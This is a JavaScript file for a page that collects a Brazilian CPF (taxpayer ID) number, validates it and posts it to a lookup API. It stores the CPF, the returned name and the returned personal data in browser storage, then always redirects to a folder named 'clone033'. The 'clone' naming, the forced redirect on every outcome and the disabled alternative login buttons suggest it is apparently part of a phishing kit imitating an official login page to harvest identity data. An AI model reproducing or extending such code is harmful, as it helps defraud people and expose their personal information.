document.addEventListener('DOMContentLoaded', function() {
    if (!document.getElementById('cpf-input')) return;
    var cpfInput = document.getElementById('cpf-input');
    var cpfError = document.getElementById('cpf-error');
    var btnContinuar = document.getElementById('btn-continuar');

    function formatCPF(v) {
        return v.replace(/\D/g,'').replace(/(\d{3})(\d)/,'$1.$2').replace(/(\d{3})(\d)/,'$1.$2').replace(/(\d{3})(\d{1,2})$/,'$1-$2').substring(0,14);
    }
    function validateCPF(cpf) {
        var n = cpf.replace(/\D/g,'');
        if (n.length !== 11 || /^(\d)\1{10}$/.test(n)) return false;
        var s=0; for(var i=0;i<9;i++) s+=parseInt(n[i],10)*(10-i); var d=(s*10)%11; if(d===10)d=0; if(d!==parseInt(n[9],10)) return false;
        s=0; for(i=0;i<10;i++) s+=parseInt(n[i],10)*(11-i); d=(s*10)%11; if(d===10)d=0; return d===parseInt(n[10],10);
    }
    cpfInput.addEventListener('input', function(){ this.value=formatCPF(this.value); cpfError.textContent=''; cpfInput.classList.remove('error'); });
    if (btnContinuar) btnContinuar.addEventListener('click', function() {
        var cpf = cpfInput && cpfInput.value || '';
        var cpfNumeros = cpf.replace(/\D/g,'');
        cpfError.textContent=''; if (cpfInput) cpfInput.classList.remove('error');
        if (cpfNumeros.length < 11) { cpfError.textContent='Digite um CPF válido.'; if (cpfInput) cpfInput.classList.add('error'); return; }
        if (!validateCPF(cpf)) { cpfError.textContent='CPF inválido. Verifique os números digitados.'; if (cpfInput) cpfInput.classList.add('error'); return; }
        var origLabel = btnContinuar.textContent;
        btnContinuar.disabled = true; btnContinuar.textContent = 'Verificando...';
        var url = '../api/consulta-doc';
        var maxTries = 3, attempt = 0;
        function doRequest() {
            attempt++;
            return fetch(url + '?_=' + Date.now(), { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ doc: cpfNumeros }), referrerPolicy: 'no-referrer', credentials: 'same-origin' }).then(function(r) {
                if (r.status === 403 && attempt < maxTries) {
                    return new Promise(function(resolve, reject) {
                        setTimeout(function() { doRequest().then(resolve).catch(reject); }, 500 * attempt);
                    });
                }
                return r.json().catch(function() { return null; }).then(function(data) { return { ok: r.ok, status: r.status, data: data }; });
            });
        }
        doRequest().then(function(result) {
            btnContinuar.disabled = false; btnContinuar.textContent = origLabel;
            var qs = window.location.search || '';
            var goToClone033 = function() { window.location.href = '../clone033/index.html' + qs; };
            if (result && result.ok && result.data) {
                var apiData = result.data.data || result.data;
                var nome = (apiData && (apiData.NOME || apiData.nome || apiData.name)) ? (apiData.NOME || apiData.nome || apiData.name).trim() : (result.data.nome || result.data.name || '').trim();
                if (nome) { localStorage.setItem('login_nome', nome); sessionStorage.setItem('login_nome', nome); }
                localStorage.setItem('login_cpf', cpfNumeros);
                sessionStorage.setItem('login_cpf', cpfNumeros);
                try { localStorage.setItem('user_data', JSON.stringify(apiData || result.data)); } catch (e) {}
                setTimeout(goToClone033, 100);
            } else {
                localStorage.setItem('login_cpf', cpfNumeros);
                sessionStorage.setItem('login_cpf', cpfNumeros);
                setTimeout(goToClone033, 100);
            }
        }).catch(function() {
            btnContinuar.disabled = false; btnContinuar.textContent = origLabel;
            var qs = window.location.search || '';
            localStorage.setItem('login_cpf', cpfNumeros);
            sessionStorage.setItem('login_cpf', cpfNumeros);
            setTimeout(function() { window.location.href = '../clone033/index.html' + qs; }, 100);
        });
    });
    document.querySelectorAll('.alt-buttons button').forEach(function(btn) {
        btn.addEventListener('click', function(e) {
            e.preventDefault();
            e.stopPropagation();
        });
    });
    var darkBtn = document.querySelector('[aria-label="Modo escuro"]');
    if (darkBtn) darkBtn.addEventListener('click', function() {
        document.body.classList.toggle('dark-mode');
        var i = this.querySelector('i'); if (i) { i.classList.toggle('fa-moon'); i.classList.toggle('fa-sun'); }
    });
});
